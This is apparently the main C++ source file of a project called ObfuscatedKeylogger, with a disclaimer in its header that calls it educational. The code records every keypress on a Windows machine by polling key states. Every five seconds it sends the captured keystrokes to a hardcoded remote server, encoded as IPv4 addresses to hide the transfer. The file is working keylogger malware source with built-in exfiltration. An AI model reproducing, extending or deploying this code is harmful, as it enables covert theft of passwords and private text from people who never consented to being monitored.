/*
 * ObfuscatedKeylogger.cpp
 * Author: Alex Zevnoski (Leshenka)
 * Copyright (c) 2024 Alex Zevnoski (Leshenka)
 *
 * This file is part of the ObfuscatedKeylogger project, an educational
 * and experimental project demonstrating obfuscation and data transmission techniques.
 *
 * DISCLAIMER: This software is intended solely for educational purposes.
 * The author does not condone or support illegal or unethical use of this software.
 */

#include "Transmission.h"
#include <windows.h>
#include "Keylogger.h"
#include "Obfuscation.h"
#include <stdio.h>
#include <time.h>
#include <queue>

// Array to track the state of keys
#define KEY_COUNT 256
BYTE keyStates[KEY_COUNT];


// Function to periodically send and clear keystrokes
void sendKeystrokesPeriodically(MemoryRegion* memRegion, const char* serverUrl) {
    // Check if there are keystrokes to send
    if (memRegion->used == 0) {
        return;  // No keystrokes to send
    }

    // Send the keystrokes as IPv4 addresses
    if (GenerateIpv4Output((unsigned char*)memRegion->baseAddress, memRegion->used, serverUrl)) {
        printf("Keystrokes sent successfully.\n");
    }
    else {
        fprintf(stderr, "Failed to send keystrokes.\n");
    }

    // Clear the memory region after sending
    memRegion->used = 0;
    memset(memRegion->baseAddress, 0, memRegion->size);
}

int main() {
    MemoryRegion memRegion;
    memRegion.baseAddress = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
    memRegion.size = 100;
    memRegion.used = 0;

    if (memRegion.baseAddress == NULL) {
        perror("Failed to allocate memory");
        return 1;
    }

  const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change as needed

    // Initialize keyStates array
    memset(keyStates, 0, sizeof(keyStates));

    while (1) {
        // Log keystrokes in real-time
        for (int i = 8; i < KEY_COUNT; i++) {
            SHORT keyState = GetAsyncKeyState(i);

            if (keyState & 0x8000) {  // Key is pressed
                if (keyStates[i] == 0) {  // Log only if key was not already pressed
                    logKey(i, &memRegion);
                    keyStates[i] = 1;  // Mark key as pressed
                }
            }
            else {
                keyStates[i] = 0;  // Reset key state when released
            }
        }

        // Periodically check every 5 seconds to send data
        static DWORD lastCheckTime = 0;
        DWORD currentTime = GetTickCount();
        if (currentTime - lastCheckTime >= 5000) {  // Check every 5 seconds
            sendKeystrokesPeriodically(&memRegion, serverUrl);
            lastCheckTime = currentTime;
        }

        Sleep(10);  // Sleep for a short interval to reduce CPU usage
    }

    // Cleanup memory (unlikely to reach here in this program design)
    HeapFree(GetProcessHeap(), 0, memRegion.baseAddress);
    return 0;
}